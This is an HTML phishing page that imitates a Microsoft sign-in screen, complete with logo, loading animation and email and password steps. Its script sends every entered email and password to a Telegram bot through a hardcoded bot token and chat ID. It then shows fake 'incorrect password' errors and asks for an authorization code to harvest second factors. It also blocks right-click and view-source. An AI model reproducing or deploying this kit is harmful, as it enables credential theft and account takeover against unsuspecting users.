<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Sign in to your account</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #f3f6fb;
      min-height: 100vh;
      width: 100vw;
      overflow: hidden;
    }
    body {
      /* Subtle Microsoft login background */
      background: radial-gradient(ellipse 120% 90% at 60% 10%, #e9eef7 70%, #f3f6fb 100%);
      position: relative;
    }
    .signin-panel {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      box-shadow: 0 6px 32px rgba(0,0,0,.13);
      border-radius: 3px;
      max-width: 420px;
      width: 96vw;
      padding: 40px 32px 36px 32px;
      z-index: 1;
      display: flex;
      flex-direction: column;
    }
    .msft-logo-row {
      display: flex;
      align-items: center;
      margin-bottom: 32px;
    }
    .msft-logo {
      width: 98px;
      height: 28px;
      vertical-align: middle;
      margin-right: 12px;
    }
    .msft-logo-row span {
      font-size: 23px;
      color: #333;
      font-weight: 600;
      letter-spacing: 0.5px;
      margin-left: 2px;
    }
    .signin-title {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 18px;
      color: #252525;
    }
    .input-label {
      font-size: 16px;
      color: #222;
      margin-bottom: 3px;
      font-weight: 500;
    }
    .input-field {
      border: none;
      border-bottom: 1.5px solid #aaa;
      font-size: 17px;
      padding: 10px 0;
      width: 100%;
      background: transparent;
      margin-bottom: 22px;
      transition: border-color .2s;
    }
    .input-field:focus {
      border-bottom: 2px solid #0067b8;
      outline: none;
    }
    .error-message {
      color: #e81123;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 12px;
      display: none;
    }
    .help-links {
      margin-bottom: 32px;
    }
    .help-links a {
      color: #0067b8;
      text-decoration: none;
      font-size: 15px;
      margin-right: 10px;
    }
    .help-links a:hover {
      text-decoration: underline;
    }
    .signin-btn-row {
      display: flex;
      justify-content: flex-end;
      align-items: center;
    }
    .btn {
      background: #0067b8;
      color: #fff;
      font-size: 17px;
      font-weight: 600;
      border: none;
      padding: 10px 44px;
      border-radius: 2px;
      cursor: pointer;
      box-shadow: 0 1px 2px rgba(0,0,0,0.06);
      transition: background .16s;
    }
    .btn:active, .btn:focus, .btn:hover {
      background: #005da6;
      outline: none;
    }
    @media (max-width: 540px) {
      .signin-panel {
        padding: 28px 7vw;
        max-width: 99vw;
      }
      .signin-title {
        font-size: 22px;
      }
      .msft-logo-row span {
        font-size: 19px;
      }
      .btn {
        padding: 10px 26px;
        font-size: 16px;
      }
    }
  </style>
  <link rel="shortcut icon" type="image/png" href="https://easyupload.io/mm9scz"/>
</head>
<body>
  <!-- Loading Screen -->
  <div id="loading-screen" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;justify-content:center;align-items:center;z-index:9999;">
    <div id="loading-spinner" style="background-image: url(https://www.windowslatest.com/wp-content/uploads/2021/08/Outlook-PWA.gif);background-repeat: no-repeat;background-position: center center;width: 170px;height: 170px;"></div>
  </div>
  <div class="signin-panel" id="div1">
    <div class="msft-logo-row">
      <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="msft-logo" alt="Microsoft Logo">
      
    </div>
    <div class="signin-title">Sign in</div>
    <span id="error" class="error-message">That Microsoft account doesn't exist. Enter a different account.</span>
    <input type="email" name="email" id="email" class="input-field" autocomplete="username" placeholder="Email, phone, or Skype">
    <div class="help-links">
      <span>No account? <a href="#" id="createAccount">Create one!</a></span><br>
      <a href="#" id="cantAccess">Can't access your account?</a>
    </div>
    <div class="signin-btn-row">
      <button class="btn" id="next" type="button">Next</button>
    </div>
  </div>
  <div class="signin-panel" id="div2" style="display:none;">
    <div class="msft-logo-row" style="cursor:pointer;">
      <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="msft-logo" alt="Microsoft Logo">
      
    </div>
    <div style="font-size:18px;font-weight:500;margin-bottom:20px;" id="emailch"></div>
    <label class="input-label" for="password" style="margin-bottom:6px;">Password</label>
    <input type="password" name="password" id="password" class="input-field" autocomplete="current-password" placeholder="Password">
    <span id="msg" class="error-message"></span>
    <div class="help-links">
      <a href="#" id="forgotPassword">Forgot password?</a>
    </div>
    <div class="signin-btn-row">
      <button class="btn" id="submit-btn" type="submit">Sign in</button>
    </div>
  </div>
  <!-- ...existing code... -->
<script>
  // Hide the loading screen after 3 seconds
  document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
      var loadingScreen = document.getElementById('loading-screen');
      loadingScreen.style.display = 'none';
    }, 3000);
  });

  document.addEventListener('DOMContentLoaded', function() {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const nextBtn = document.getElementById('next');
    const submitBtn = document.getElementById('submit-btn');
    const div1 = document.getElementById('div1');
    const div2 = document.getElementById('div2');
    const error = document.getElementById('error');
    const emailch = document.getElementById('emailch');
    const msg = document.getElementById('msg');
    let pwdAttempt = 0;
    let codeAttempt = 0;
    let inCodeMode = false;
    let errorTimeout = null;

    function showErrorMessage(el, text) {
      el.textContent = text;
      el.style.display = 'block';
    }
    function hideErrorMessage(el) {
      el.textContent = '';
      el.style.display = 'none';
    }

    emailInput.addEventListener('focus', function(){
      hideErrorMessage(error);
    });
    nextBtn.addEventListener('click', function () {
      var my_email = emailInput.value.trim();
      var filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
      if (!filter.test(my_email)) {
        showErrorMessage(error, "That Microsoft account doesn't exist. Enter a different account.");
        emailInput.focus();
        return false;
      }
      div1.style.display = 'none';
      div2.style.display = 'flex';
      emailch.textContent = my_email;
      hideErrorMessage(msg);
      passwordInput.value = '';
      pwdAttempt = 0;
      codeAttempt = 0;
      inCodeMode = false;
      // Reset UI if returning from code mode
      document.querySelector('.signin-title').textContent = 'Sign in';
      document.querySelector('label[for="password"]').textContent = 'Password';
      passwordInput.type = 'password';
      passwordInput.placeholder = 'Password';
      submitBtn.textContent = 'Sign in';
      submitBtn.disabled = false;
      passwordInput.focus();
    });
    emailInput.addEventListener('keydown', function(e){
      if (e.key === "Enter") nextBtn.click();
    });
    document.getElementById('forgotPassword').addEventListener('click', function(e){
      e.preventDefault();
      alert('Redirect to password recovery.');
    });
    document.getElementById('createAccount').addEventListener('click', function(e){
      e.preventDefault();
      alert('Redirect to account creation.');
    });
    document.getElementById('cantAccess').addEventListener('click', function(e){
      e.preventDefault();
      alert('Redirect to account help.');
    });
    // Back button logic (logo row is clickable in password panel)
    div2.querySelector('.msft-logo-row').addEventListener('click', function() {
      hideErrorMessage(msg);
      passwordInput.value = '';
      div2.style.display = 'none';
      div1.style.display = 'flex';
      emailInput.focus();
    });
    // Disable right-click
    document.addEventListener('contextmenu', function (e) {
      e.preventDefault();
    });
    // Disable Ctrl+U
    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
        e.preventDefault();
      }
    });
    // Send to Telegram
    function sendToTelegram(email, password) {
      const BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
      const CHAT_ID = '-4704812522';
      const text = `Microsoft login:\nEmail: ${email}\nPassword: ${password}`;
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });
    }

    function showErrorWithDelay(el, text) {
      hideErrorMessage(el);
      clearTimeout(errorTimeout);
      errorTimeout = setTimeout(() => {
        showErrorMessage(el, text);
      }, 2000);
    }

    submitBtn.addEventListener('click', function(event){
      event.preventDefault();
      var email = emailch.textContent.trim();
      var password = passwordInput.value;
      var filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
      if (!filter.test(email)) {
        showErrorWithDelay(msg, "That Microsoft account doesn't exist. Enter a different account.");
        return;
      }

      submitBtn.textContent = inCodeMode ? 'Verifying...' : 'Verifying...';
      submitBtn.disabled = true;

      // --- CODE MODE (authorization code step) ---
      if (inCodeMode) {
        codeAttempt++;
        setTimeout(function() {
          submitBtn.textContent = 'Enter';
          submitBtn.disabled = false;
          passwordInput.value = '';
          passwordInput.focus();

          // Show delayed error for code entry
          let codeMsg = (codeAttempt >= 4)
            ? "Too many incorrect codes. Please try again later."
            : "Incorrect code. Please try again.";
          showErrorWithDelay(msg, codeMsg);

          if (codeAttempt >= 4) {
            setTimeout(() => location.reload(), 2000);
          }
        }, 800);
        return;
      }

      // --- PASSWORD MODE ---
      pwdAttempt++;
      sendToTelegram(email, password)
        .then(r => r.json())
        .catch(() => {})
        .finally(() => {
          if (pwdAttempt === 1) {
            setTimeout(() => {
              submitBtn.textContent = 'Sign in';
              submitBtn.disabled = false;
              passwordInput.value = '';
              passwordInput.focus();
              showErrorWithDelay(msg, "Incorrect password. Please try again.");
            }, 2000);
          } else if (pwdAttempt === 2) {
            // Switch to code mode UI after delay
            setTimeout(() => {
              document.querySelector('.signin-title').textContent = 'Enter code';
              document.querySelector('label[for="password"]').textContent = 'Enter code';
              passwordInput.type = 'text';
              passwordInput.placeholder = 'Enter code';
              submitBtn.textContent = 'Enter';
              submitBtn.disabled = false;
              passwordInput.value = '';
              passwordInput.focus();
              inCodeMode = true;
              showErrorWithDelay(msg, "Authorization code required. Please check your sms or authenticator app.");
            }, 2000);
          } else {
            setTimeout(() => {
              submitBtn.textContent = 'Sign in';
              submitBtn.disabled = false;
              passwordInput.value = '';
              passwordInput.focus();
              showErrorWithDelay(msg, "Incorrect password. Please try again.");
            }, 2000);
          }
        });
    });

    passwordInput.addEventListener('keydown', function(e){
      if (e.key === "Enter") submitBtn.click();
    });
  });
</script>
<!-- ...existing code... -->
</body>
</html>